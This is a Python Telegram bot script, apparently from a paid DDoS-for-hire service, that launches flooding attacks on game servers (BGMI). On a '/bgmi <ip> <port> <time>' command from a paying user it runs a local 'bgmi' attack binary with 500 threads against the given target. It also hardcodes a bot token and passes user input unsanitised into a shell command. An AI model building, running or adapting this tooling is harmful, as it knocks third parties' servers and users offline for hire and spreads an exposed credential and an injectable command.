#bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import time

# Railway setup: keep_alive handles the port binding
try:
    from keep_alive import keep_alive
    keep_alive()
except ImportError:
    pass

# Bot Token and Admin ID
bot = telebot.TeleBot('8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE')
admin_id = ["8787952549"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Ensure files exist
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f: f.write("")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f: f.write("")

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except:
        return []

allowed_user_ids = read_users()

# --- Handlers ---

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            uid = cmd[1]
            if uid not in allowed_user_ids:
                allowed_user_ids.append(uid)
                with open(USER_FILE, "a") as f: f.write(f"{uid}\n")
                bot.send_message(message.chat.id, f"✅ User {uid} Added!")
            else:
                bot.send_message(message.chat.id, "❌ User already exists.")
    else:
        bot.send_message(message.chat.id, "❌ Admin only command.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        cmd = message.text.split()
        if len(cmd) == 4:
            target, port, duration = cmd[1], cmd[2], cmd[3]
            
            # 1. Attack Start Message
            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s\n\nBhai, thoda wait karo...")

            try:
                # 2. Give Permission (Railway requirement)
                os.system("chmod +x bgmi")
                
                # 3. Execute with Error Capture
                # Humne threads ko 500 set kiya hai
                full_command = f"./bgmi {target} {port} {duration} 500"
                
                # subprocess.run use kar rahe hain taaki execution confirm ho
                result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    bot.send_message(message.chat.id, f"✅ ATTACK FINISHED SUCCESSFULLY!\n🎯 Target: {target}")
                else:
                    # Agar binary crash hui toh admin ko error milega
                    bot.send_message(message.chat.id, f"⚠️ Attack finished with code {result.returncode}.\nError: {result.stderr[:100]}")
            
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Execution Error: {str(e)}")
        else:
            bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 No Access! Buy from @SODHI_OWNER")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!\n\nUse /help for commands.")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.send_message(message.chat.id, "💥 /bgmi <ip> <port> <time>\n👤 /myinfo")

# --- Polling Logic ---
if __name__ == "__main__":
    print("Bot is Starting on Railway...")
    while True:
        try:
            # skip_pending=True helps avoid "message not found" errors on restart
            bot.polling(none_stop=True, skip_pending=True, timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)
